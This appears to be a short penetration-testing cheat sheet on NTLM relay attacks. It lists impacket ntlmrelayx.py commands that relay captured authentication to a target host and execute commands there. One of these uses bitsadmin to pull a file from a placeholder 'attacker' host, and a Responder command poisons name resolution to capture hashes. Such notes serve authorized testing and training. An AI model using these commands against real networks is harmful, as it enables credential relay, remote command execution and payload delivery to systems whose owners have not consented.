# NTLM relay

### impacket ntmlrelay.py

```csharp
proxychains sudo ntlmrelayx.py --no-http-server -smb2support -t <TARGET>  -c 'cmd /C ipconfig' 
```

```csharp
proxychains sudo ntlmrelayx.py --no-http-server -smb2support -t 172.16.54.14  -c 'cmd /C bitsadmin.exe /Transfer hehe http://attacker/stcreat.html'
```

### Responder

```csharp
sudo responder -I tun0
```

